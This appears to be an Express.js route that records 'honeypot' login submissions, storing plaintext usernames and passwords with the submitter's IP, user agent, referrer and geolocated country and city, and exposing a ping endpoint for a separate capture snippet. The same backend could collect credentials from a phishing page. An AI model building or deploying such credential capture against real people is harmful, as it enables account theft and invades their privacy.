'use strict';

const express = require('express');
const db = require('../db');
const geo = require('../geo');

const router = express.Router();

function clean(value, max) {
  return String(value == null ? '' : value).trim().slice(0, max);
}

/**
 * POST /api/capture — record a honeypot submission.
 *
 * Body: { username, password, method?, page?, ip?, country?, city? }
 */
router.post('/', async (req, res, next) => {
  try {
    const body = req.body || {};
    const username = clean(body.username, 254);
    const password = clean(body.password, 2000);
    const method = clean(body.method, 20) || 'unknown';

    // Extract real client IP through Fly.io reverse proxies using X-Forwarded-For header
    const forwardedHeader = req.get('x-forwarded-for');
    const clientIp = forwardedHeader ? forwardedHeader.split(',')[0].trim() : null;
    const ip = clean(body.ip, 45) || clientIp || req.ip || req.socket.remoteAddress || '';

    const userAgent = clean(body.userAgent, 400) || clean(req.get('user-agent'), 400);
    const referrer = clean(body.referrer, 400) || clean(req.get('referer'), 400);

    let country = clean(body.country, 80);
    let city = clean(body.city, 80);

    // Geolocation lookup wrapped in try/catch so API lookup failures won't block record insertion
    if ((!country || !city) && ip) {
      try {
        const g = await geo.lookup(ip);
        if (g) {
          if (!country) country = clean(g.country, 80);
          if (!city) city = clean(g.city, 80);
        }
      } catch (geoErr) {
        console.warn('[capture] Geolocation lookup failed:', geoErr.message);
      }
    }

    const info = db.prepare(`
      INSERT INTO submissions (username, password, method, ip, country, city, user_agent, referrer)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `).run(username, password, method, ip, country, city, userAgent, referrer);

    console.log(
      `[capture] #${info.lastInsertRowid} ${method} | ${username || '(no username)'} | ${ip} | ${country || '-'} / ${city || '-'}`
    );

    res.status(201).json({ ok: true, id: Number(info.lastInsertRowid) });
  } catch (e) {
    next(e);
  }
});

// Lightweight connectivity probe for the capture snippet.
router.get('/ping', (req, res) => {
  res.json({ ok: true });
});

module.exports = router;